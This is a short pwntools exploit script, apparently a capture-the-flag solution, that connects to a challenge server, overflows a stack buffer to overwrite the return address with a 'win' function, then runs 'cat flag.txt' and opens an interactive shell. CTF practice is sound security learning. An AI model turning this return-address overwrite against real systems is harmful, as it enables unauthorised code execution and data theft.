#!/usr/bin/env python3

from pwn import *


r = remote('sharkyctf.xyz', 20333)
context.arch = 'amd64'

offset = 0x20
win_func = 0x4006a7

payload = b'a'*offset + b'b'*8 + p64(win_func)
r.sendline(payload)

r.sendline('cat flag.txt')

r.interactive()
